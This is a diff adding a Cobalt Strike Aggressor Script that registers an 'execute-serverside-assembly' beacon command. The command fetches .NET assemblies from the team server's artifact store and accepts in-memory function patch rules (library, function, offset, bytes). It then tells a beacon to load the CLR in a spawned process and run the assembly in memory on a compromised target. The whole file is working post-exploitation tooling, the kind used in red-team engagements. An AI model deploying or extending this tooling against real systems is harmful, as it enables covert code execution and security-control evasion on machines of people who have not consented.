@@ -1,0 +1,117 @@
+debug(7 | 34); # 34 is required for try/catch
+include(script_resource("../cs_rest_api_lib.cna"));
+
+sub get_artifacts_list_by_type {
+    local('$artifact_type $filter_regex $response_get_artifacts', '$artifacts_list', '@artifact_names', '$artifact', '$artifact_file_name', '$dialog');
+    $artifact_type = $1;
+    if (size(@_) == 1) {
+        $filter_regex = $null;
+    }
+    else if (size(@_) == 2) {
+        $filter_regex = $2;
+    }
+    $response_get_artifacts = apiGET("/api/v1/artifacts");
+    if ($response_get_artifacts["status"] == 200){
+        $artifacts_list = $response_get_artifacts["content"];
+        %artifact_names = %();
+        foreach $artifact ($artifacts_list) {
+            $artifact_file_name = split('/',$artifact["key"]);
+            if ($artifact_file_name[0] eq $artifact_type && ($filter_regex is $null || $artifact["key"] ismatch $filter_regex)) {
+                %artifact_names[$artifact_file_name[1]] = $artifact["symbolicReference"];
+            }    
+        }   
+
+        return %artifact_names;
+    } else {
+        show_error("Failed to retrieve artifacts list from server.\nCheck the Aggressor Script console for details.");
+        exit();
+    }
+}
+
+sub execute_serverside_assembly {
+    local('$beacon_id $patches $assembly_path $arguments $response_post $available_assemblies $assembly_artifact_path $statusUrl $status $key $available_assemblies_list @patch_rules $patch_rule $structured_patches');
+    $beacon_id = $1;
+    if (size(@_) == 1) {
+        $patches = $null;
+        $assembly_path = $null;
+        $arguments = $null;
+    }
+    else if(size(@_) == 2)
+	{
+		$patches = $null;
+        $assembly_path = $2;
+        $arguments = $null;
+	}
+    else if(size(@_) == 3) {
+        $patches = iff($2 ismatch "^PATCHES:.*$", $2, $null);
+        $assembly_path = iff($patches ismatch "^PATCHES:.*$", $3, $2);
+        $arguments = iff($patches ismatch "^PATCHES:.*$", $null, $3);
+    }
+    else if(size(@_) == 4) {
+        $patches = iff($2 ismatch "^PATCHES:.*$", $2, $null);
+        $assembly_path = iff($patches ismatch "^PATCHES:.*$", $3, $2);
+        $arguments = iff($patches ismatch "^PATCHES:.*$", $4, $3);
+    }
+    # Parse Patches
+    if ($patches ismatch "^PATCHES:.*$"){
+        $patches = strrep($patches, "PATCHES: ", "");
+        @patch_rules = split(" ", $patches);
+        $structured_patches = "\[";
+        foreach $patch_rule (@patch_rules) {
+            $patch_rule_item = split(",", $patch_rule);
+            $structured_patches = $structured_patches . '{"library": "' . $patch_rule_item[0] .'", "function": "'.$patch_rule_item[1].'", "offset": '.$patch_rule_item[2].', "patch": "'.$patch_rule_item[3] .'"},';
+        }
+        $structured_patches = $structured_patches . "\]";
+        $structured_patches = strrep($structured_patches, ",]", "]");
+    }
+    
+    $available_assemblies = get_artifacts_list_by_type("assemblies");
+    if ($assembly_path is $null || $assembly_path eq "" || $assembly_path !in keys($available_assemblies)) {
+        if (size($available_assemblies) == 0) {
+            berror("No assemblies found in the artifacts store under /artifacts/assemblies/.\nPlease upload an assembly first.");
+            exit();
+        }
+        foreach $key (keys($available_assemblies)) {
+            $available_assemblies_list = iff($available_assemblies_list is $null, $key, $available_assemblies_list . "\n\t- " . $key);
+        }
+        berror($1,"\nYou need to use one of the following .NET assembly artifacts: \n\t- " .$available_assemblies_list . "\n\nUse: execute-serverside-assembly \"[assembly_name]\" \"[arguments]\"");
+        exit();
+    }
+    $assembly_artifact_path = $available_assemblies[$assembly_path];
+    $arguments = $arguments;
+    $response_post = apiPOST("/api/v1/beacons/" . $beacon_id . "/spawn/dotnetAssembly",
+                         '{"assembly": "' . $assembly_artifact_path . '","arguments": "' . $arguments . '", "patches": ' . iff($patches is $null, '[]', $structured_patches) . '}'
+                         );
+    if ($response_post["status"] != 200) {
+        println("Failed to execute assembly on target. Response: " . $response_post);
+    }
+}
+
+alias execute-serverside-assembly {
+    if(size(@_) == 1) {
+        execute_serverside_assembly($1);
+    }
+    else if(size(@_) == 2) {
+        execute_serverside_assembly($1, $2);
+    }
+    else if(size(@_) == 3) {
+        execute_serverside_assembly($1, $2, $3);
+    }
+    else if(size(@_) == 4) {
+        execute_serverside_assembly($1, $2, $3, $4);
+    }
+    else {
+        berror("Invalid number of arguments.\nUse: execute-serverside-assembly [file.exe] [arguments]\nUse: execute-serverside-assembly \"[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]\" [file.exe] [arguments]");
+    }
+}
+
+beacon_command_group(
+   "serverside_commands_group",
+   "Serverside Artifact Execution",
+   "Commands to execute artifacts on the Cobalt Strike server side.");
+
+beacon_command_register(
+"execute-serverside-assembly", 
+"Execute a server-side .NET program in-memory on target", 
+"Use: execute-serverside-assembly [file.exe] [arguments]\nUse: execute-serverside-assembly \"[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]\" [file.exe] [arguments]\n\nExecutes a server-side .NET process assembly on target. This command loads the CLR in a temporary process and loads the assembly into it. If the assembly is in the data store, this command will use the loaded item automatically. For more information (help data-store).",
+"serverside_commands_group");
